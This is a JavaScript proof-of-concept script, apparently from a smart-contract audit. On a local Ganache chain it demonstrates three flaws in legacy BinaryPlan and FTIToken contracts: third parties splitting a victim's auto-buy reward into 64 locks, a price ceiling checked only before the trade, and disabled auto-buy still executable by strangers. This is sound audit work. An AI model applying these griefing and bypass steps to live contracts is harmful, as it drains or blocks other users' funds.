// Local EVM diagnostic only; baseline findings PASS when the legacy weakness is observed.
import ganache from 'ganache';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import {createHash} from 'node:crypto';
import {BrowserProvider,parseEther as E,formatEther,MaxUint256} from 'ethers';
import {deploySuite,settle,checkAccounting} from './lib.mjs';
// Intentionally targets the old implementation. Do not run against patched artifacts.
const legacyHashes={BinaryPlan:'e10b84968158510e1c987a92feff9c322f25cec1434d4e4a50788342bf59e779',FTIToken:'a84f96d600e1ca7ee912ca185a2fc5c0a9708d44d52810c9924bcff7cd32c2a5'};
for(const[name,expected]of Object.entries(legacyHashes)){
 const artifact=JSON.parse(fs.readFileSync(`artifacts/${name}.json`,'utf8'));
 const hash=createHash('sha256').update(Buffer.from(artifact.bytecode.slice(2),'hex')).digest('hex');
 if(hash!==expected)throw new Error(`This legacy diagnostic requires artifacts compiled from main 2e1507f (${name} differs). Use a separate checkout; see docs/CORE-REVIEW.md.`);
}
const engine=ganache.provider({logging:{quiet:true},chain:{chainId:31337,time:new Date('2026-09-15T12:00:00Z')},wallet:{totalAccounts:45},miner:{blockGasLimit:30000000}});
const p=new BrowserProvider(engine,undefined,{cacheTimeout:-1});p.pollingInterval=10;
try{
 const signers=await Promise.all(Array.from({length:45},(_,i)=>p.getSigner(i))),s=await deploySuite(signers);
 for(const i of [0,1,2]){await(await s.usd.connect(signers[i]).faucet()).wait();await(await s.usd.connect(signers[i]).approve(s.binary.target,MaxUint256)).wait();await(await s.usd.connect(signers[i]).approve(s.token.target,MaxUint256)).wait();}
 for(const[i,n]of [[0,1],[1,100],[2,100]])await(await s.binary.connect(signers[i]).addUnits(n)).wait();await settle(s,p);
 await(await s.binary.setAutoBuy(true,E('1'))).wait();for(const i of [1,2])await(await s.binary.connect(signers[i]).addUnits(5)).wait();await settle(s,p);
 assert.equal(await s.binary.pendingAuto(s.addresses[0]),E('45'));
 let snapshot=await p.send('evm_snapshot',[]);const result={deployment:'local Ganache only',baseline:'main 2e1507f; legacy BinaryPlan and FTIToken',findings:[]};
 // A stranger controls amount, splitting a victim's one pending reward into 64 live locks.
 const chunk=E('0.000001');for(let i=0;i<64;i++)await(await s.binary.connect(signers[44]).executeAuto(s.addresses[0],chunk)).wait();
 assert.equal((await s.token.lockInfo(s.addresses[0])).length,64);
 await assert.rejects(async()=>{await(await s.token.buy(E('10'),0,MaxUint256)).wait();});await checkAccounting(s);
 result.findings.push({name:'third-party lock-slot grief',untrustedCalls:64,victimUSDSpent:formatEther(64n*chunk),pendingUSD:formatEther(await s.binary.pendingAuto(s.addresses[0])),manualPurchase:'blocked at live-lock bound'});
 await p.send('evm_revert',[snapshot]);snapshot=await p.send('evm_snapshot',[]);
 const spot=await s.token.price(),ceiling=spot*101n/100n,amount=await s.binary.pendingAuto(s.addresses[0]);
 await(await s.binary.setAutoBuy(true,ceiling)).wait();await(await s.binary.connect(signers[44]).executeAuto(s.addresses[0],amount)).wait();const minted=await s.token.balanceOf(s.addresses[0]);assert(amount*E('1')>minted*ceiling);await checkAccounting(s);
 result.findings.push({name:'maximum price only checks pre-trade spot',configuredMax:formatEther(ceiling),effectiveUSDPerFTI:formatEther(amount*E('1')/minted),pendingUSDConsumed:formatEther(amount)});
 await p.send('evm_revert',[snapshot]);
 await(await s.binary.setAutoBuy(false,E('1'))).wait();await(await s.binary.connect(signers[44]).executeAuto(s.addresses[0],amount)).wait();assert.equal(await s.binary.pendingAuto(s.addresses[0]),0n);await checkAccounting(s);
 result.findings.push({name:'disabled auto-buy still executable by a stranger',pendingUSDConsumed:formatEther(amount)});
 fs.writeFileSync('docs/core-autobuy-legacy-findings.json',JSON.stringify(result,null,2)+'\n');console.log(JSON.stringify(result,null,2));
}finally{await engine.disconnect();}
